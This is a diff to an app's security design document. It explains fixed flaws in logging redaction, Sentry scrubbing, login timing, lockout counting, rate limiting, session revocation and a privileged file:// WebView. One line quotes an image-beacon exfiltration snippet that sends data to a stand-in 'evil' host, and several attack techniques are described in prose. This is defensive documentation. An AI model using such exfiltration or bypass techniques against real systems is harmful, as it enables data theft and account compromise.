@@ -62,6 +62,30 @@ password-bearing identifier, and separately fails the build on any remaining
 `console.log`. The logger also redacts `password`, `token`, `secret`,
 `authorization`, and friends as a backstop.
 
+**Redaction paths cannot reach inside a string, and two leaks exploited that.**
+
+*Drizzle bind values.* `DrizzleQueryError` does not merely carry the failing
+statement — it interpolates the SQL **and every bind value** into its own
+`message`, and therefore into `stack`. The logger redacts `err.query` and
+`err.params`, which handles the structured fields and can do nothing about
+`message`: a redact path matches a property, not a substring of one. So a signup
+collision wrote an email address and a bcrypt hash into the log, a profile write
+wrote free-text injury notes, and the age gate wrote a date of birth. All of it
+also went to Sentry, which sends it off-box. `lib/dbErrors.ts` now replaces such
+an error with one carrying only the SQLSTATE and the constraint name, applied at
+the pino `err` serializer and inside `reportError` — the two boundaries every
+error crosses, rather than at each call site.
+
+*Sentry transactions.* All of the scrubbing lived in `beforeSend`, which the SDK
+invokes **only for error events**. With `tracesSampleRate` defaulting to 0.1 the
+SDK also emits transaction events, and those go through `beforeSendTransaction` —
+which did not exist. One request in ten therefore shipped
+`request.headers.authorization` (a live 7-day session JWT) and the full
+`request.url` off-box; on the reset-page route that URL is
+`/reset-password?token=<single-use credential>`. Both hooks now run the same
+function, and it strips the query half of `request.url` as well as
+`query_string` — deleting the latter alone left the token in the former.
+
 ---
 
 ## Authentication responses
@@ -94,6 +118,21 @@ instantly and unknown-email responses came back measurably faster than
 wrong-password ones — an enumeration oracle. A test asserts the two paths cost
 comparable time.
 
+**The progressive delay was a second oracle, and it survived the first fix.**
+The delay applied after a failure used to be `progressiveDelayMs(user.failed
+LoginAttempts)` — read from the row — while the "no such account" branch, having
+no row, slept a flat `progressiveDelayMs(1)` = 250 ms forever. So the bcrypt
+cost was equalised and the *sleep after it* was not: two probes told a registered
+address (500 ms) from an unregistered one (250 ms), and by the fourth probe the
+margin was 4000 ms against 250. Every byte of both responses was identical and
+the enumeration worked anyway.
+
+The delay is now `failureDelayMs(ip)`, keyed on the **requesting IP** rather than
+on the account, so it escalates identically on every branch — it no longer
+depends on anything the attacker is trying to learn. Nothing is lost: this
+control only ever slowed one origin guessing quickly, which is exactly what the
+IP counter measures. The per-account control is the lockout, which is unchanged.
+
 ---
 
 ## Account lockout and rate limiting
@@ -104,11 +143,29 @@ Two independent controls with different jobs.
 
 - **5** consecutive failures → locked for **15 minutes**
 - Progressive delay on failures: 250 ms doubling to a 4 s cap. Applied to
-  failures only, so it can't be used as an oracle.
+  failures only, and keyed on the requesting IP — see **Timing** above for why
+  keying it on the account made it an enumeration oracle.
 - The counter resets on any successful sign-in, and a successful password reset
   clears the lock (the owner proved control of the mailbox).
 - On lockout, the account owner gets an email with a reset link. The HTTP
   response is unchanged.
+
+**The increment is computed by the database, not by the request.** It used to be
+`set({ failedLoginAttempts: currentAttempts + 1 })`, where `currentAttempts` was
+read *before* the ~250 ms bcrypt comparison — so every attempt that started
+inside that window read the same value and wrote the same value, and N concurrent
+guesses advanced the counter by one. The lockout was therefore "five consecutive
+**serialised** failures", and an attacker opening connections in parallel never
+reached it. `failed_login_attempts + 1` is now evaluated inside the `UPDATE`, and
+`locked_until` is set in the same statement from the post-increment value.
+
+**The lockout notice is capped at one per 12 hours per account**
+(`users.lockout_notified_at`, migration `0010`). The counter is never decayed, so
+once an account is past the threshold *every* later failure re-satisfies the lock
+condition — which used to send another email each time. Four requests an hour
+kept an account permanently locked out of password login *and* turned the mail
+provider into an amplifier pointed at the victim's inbox. It was the only
+outbound mail path with no per-account ceiling.
 
 ### Per-IP rate limits
 
@@ -118,7 +175,9 @@ Two independent controls with different jobs.
 | `POST /api/auth/signup` | 5 |
 | `POST /api/auth/forgot-password` | 3 |
 | `POST /api/auth/reset-password` | 5 |
+| `DELETE /api/profile/account` | 5 (checks a password — see below) |
 | other `/api/auth/*` | 20 |
+| malformed request bodies | 20 |
 | `/api/chat` | 20 (Claude inference costs money) |
 | `/api/analyses` | 20 |
 | everything else under `/api` | 120 |
@@ -132,9 +191,48 @@ Two independent controls with different jobs.
 > request appears to come from the proxy and the limits apply globally — safe,
 > but noisy. The server logs a warning on boot in that state.
 
-State is per-process and in memory. Correct for a single instance; move the
-buckets to Redis before scaling horizontally. The **account** counters are in
-Postgres and already survive both restarts and multiple instances.
+State is per-process and in memory unless `REDIS_URL` is set. The **account**
+counters are in Postgres and already survive both restarts and multiple
+instances.
+
+### What a bucket is keyed on
+
+Credential endpoints key on the **client IP** — there is no account yet, and the
+network origin is the only thing there is to ration.
+
+Authenticated endpoints (`/api/chat`, `/api/analyses`, the `/api` catch-all) key
+on the **account**, falling back to the IP when a request carries no valid token.
+Keying those on the IP was wrong twice over: a gym's wifi, an office, or
+carrier-grade NAT puts hundreds of athletes behind one address, so one heavy user
+throttled strangers and an individual's real limit depended on who else was on
+their carrier; and it is the weaker control once a session exists, because a
+token holder can rotate IPs and cannot rotate the account they are authenticated
+as.
+
+The limiters run above the router, so they resolve the bearer token themselves
+via `lib/requestIdentity.ts`, which memoises the verification on the request.
+`authenticate` reads the same cache rather than verifying a second time.
+
+**There are three password-checking endpoints, and all three go through
+`lib/passwordAuth.ts`.** `POST /auth/login`, the account-link challenge at
+`POST /auth/oauth/link`, and `DELETE /profile/account`. The third was added later
+and called `verifyPassword` directly — so for as long as it did, it was an
+unthrottled password oracle reachable with nothing but a session token: no
+lockout check, no failure counter, no progressive delay, no timing equalisation,
+and only the 120/min catch-all in front of it, twelve times the login route's
+budget. An attacker holding a stolen phone or a leaked JWT could brute-force the
+password there while `/auth/login` sat locked. It now routes through the shared
+path like the other two, and has a limiter of its own.
+
+**A malformed body used to bypass every limiter.** `express.json` is mounted
+above the limiters, and a parse failure calls `next(err)`, which skips every
+remaining three-arity middleware — so a request with a deliberately broken body
+reached the error handler having consumed no bucket at all, on every route in the
+app. A four-arity handler now sits directly under the body parsers and charges
+those to a bucket of their own. It also deletes `err.body`, which body-parser
+populates with the entire raw body: the global error handler logged that
+wholesale, so a failed parse of a login request wrote the plaintext password into
+the log.
 
 ---
 
@@ -281,6 +379,35 @@ it is refused, regardless of signature validity.
 **Set on password reset.** Without it, a user who resets their password *because*
 they believe someone is in their account leaves the attacker signed in for up to
 a week — the one action they are told to take would accomplish nothing.
+
+**Also set on a password reset only.** It is the blunt instrument, and a reset is
+where ending everything is the point.
+
+### Signing out one device
+
+`POST /auth/logout`. Signing out used to be a purely client-side act: the app
+deleted its copy of the token and nothing else, so the credential stayed valid
+for the rest of its 7 days and `sessions_valid_after` had exactly one writer. A
+user who signed out on a borrowed or stolen phone had done nothing at all to the
+live token still in that device's storage, and the only way to invalidate it was
+to reset a password they had no reason to think was compromised.
+
+Every token now carries a **`jti`**, and a row in `revoked_sessions` refuses
+exactly that token — so signing out on a phone does not sign the same person out
+of their tablet. `authenticate` answers both revocation questions in one round
+trip, by left-joining the denylist on the presented token's id, so being
+authenticated does not cost a second query.
+
+A token minted before `jti` existed has nothing to name it by. Rather than
+letting sign-out silently do nothing for those, it falls back to bumping the
+cutoff — blunter than the user asked for, but a sign-out that does not sign you
+out is the failure this exists to fix. Those tokens age out within a week and
+the fallback goes with them.
+
+Revocation rows are pruned once the token they name has expired anyway
+(`pruneRevokedSessions`, on the same six-hourly sweep as the reset tokens); a
+revocation that outlives its token is dead weight on every request's join.
+Migration `0012_revoked_sessions.sql`.
 
 The comparison is `<=`, not `<`: `iat` has one-second resolution, so a strict
 comparison would admit a token minted in the same second as the reset.
@@ -481,6 +608,67 @@ enumerable by trying to sign into them.
 **Account deletion** accepts a password *or* a fresh identity token from a
 provider already linked to that account — never merely a valid token, which
 would let any Apple sign-in delete any account whose session the caller held.
+
+---
+
+## Third-party code in the measurement WebView
+
+The pose runtime — MediaPipe, 22 MB across nine files — is **served by this API**,
+not by a public CDN.
+
+It used to come from jsDelivr, which meant a free CDN with no data processing
+agreement received every EU/UK athlete's IP address on every pose session: a
+transfer with no contractual basis, which the privacy policy had to disclose as
+one. `scripts/fetch-mediapipe.mjs` now vendors it at build time and
+`routes/mediapipe.ts` serves it from `/assets/mediapipe/`.
+
+The integrity story improved as a side effect, and that was the larger problem.
+The old arrangement pinned an SRI hash on `pose.js` and on nothing else — so
+47 kB of the 22 MB was checked, and the rest, **including the WebAssembly binary
+that actually runs and the model it runs against**, was accepted from a CDN on
+trust. `locateFile` fetches are made by the wasm loader rather than by
+`<script>` tags, so there is no attribute to hang a hash on. The vendoring script
+verifies a SHA-384 for every one of the nine files and refuses to write a
+mismatch, so the check moved from the device to the build and now covers all of
+it.
+
+Both wasm variants are vendored deliberately. `pose.js` requests the SIMD and
+non-SIMD builds and lets the browser choose; the iOS deployment target is 15.1
+and WKWebView only gained WebAssembly SIMD in 16.4, so dropping the fallback
+would silently break pose tracking on supported devices.
+
+### The file:// privilege, and what bounds it
+
+Both measurement screens grant `allowUniversalAccessFromFileURLs`, because a
+`file://` document fetching from `https://` is cross-origin however trustworthy
+the origin. Removing it entirely means bundling all 22 MB into the app binary,
+which is an app-size decision rather than a security one. Three controls bound it
+in the meantime, and they are worth reading as a set because each closes a
+different step of the same attack:
+
+1. **Getting script in.** The video URI was interpolated into an inline
+   `<script>` with `JSON.stringify`, which escapes for the JavaScript string
+   grammar and not for the HTML around it — the parser finds `</script` first.
+   `jsonForScript` escapes for the script context, and `isLocalAppFile` refuses
+   any URI that is not a `file://` path inside the app's own sandbox, so the deep
+   link that carried it no longer reaches the document at all.
+2. **Getting data out.** The document now carries a `Content-Security-Policy`
+   meta tag whose `connect-src` names only our own API. The danger these flags
+   create is not that script here can *read* local files — it is that it can read
+   them and then send them somewhere, and fetch, XHR, WebSocket and `sendBeacon`
+   now have nowhere to go. `img-src` closes the oldest workaround for exactly
+   that (`new Image().src = "https://evil/?" + data`) and `form-action` the other.
+3. **Navigating away.** `originWhitelist` is `["file://*"]`, so a navigation to
+   any other origin is handed to the OS browser rather than loaded inside the
+   privileged WebView.
+
+The policy deliberately sets **no `default-src` and no `script-src`**. Getting
+those right around a WebAssembly module that compiles a 6 MB binary and spawns
+its own workers is exactly the kind of change that looks correct, ships, and then
+fails on one iOS version — and pose tracking is the product. Without a
+`default-src`, an unlisted directive is simply unrestricted, so the policy above
+is the whole of what is enforced and none of it touches how the runtime loads.
+Tightening it is a device-verification task, not a desk one.
 
 ---
 
